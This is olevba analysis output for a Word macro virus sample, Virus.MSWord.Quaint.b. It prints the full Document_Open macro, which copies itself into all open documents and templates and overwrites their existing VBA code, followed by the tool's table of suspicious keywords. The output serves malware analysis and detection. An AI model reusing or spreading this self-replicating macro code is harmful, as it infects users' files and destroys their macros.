olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Quaint.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Quaint.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): s = 1: y = y + s
Set td = ThisDocument: Set DOCS = Documents: Set temps = Templates
vhost = td.VBProject.vbcomponents(y).codemodule.lines(y, 22)
For ASD234 = y To DOCS.Count
    If DOCS(ASD234).VBProject.Description <> "Virus Bosnia by e[ax]" Then
        With DOCS(ASD234).VBProject.vbcomponents(y).codemodule
            .DELETELINES y, .COUNTOFLINES
            .addfromstring vhost
        End With
    End If
DOCS(ASD234).VBProject.Description = "Virus Bosnia by e[ax]"
Next ASD234
For ASD235 = y To temps.Count
    If temps(ASD235).VBProject.Description <> "Virus Bosnia by e[ax]" Then
        With temps(ASD235).VBProject.vbcomponents(y).codemodule
            .DELETELINES y, .COUNTOFLINES
            .addfromstring vhost
        End With
    End If
temps(ASD235).VBProject.Description = "Virus Bosnia by e[ax]"
Next ASD235
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

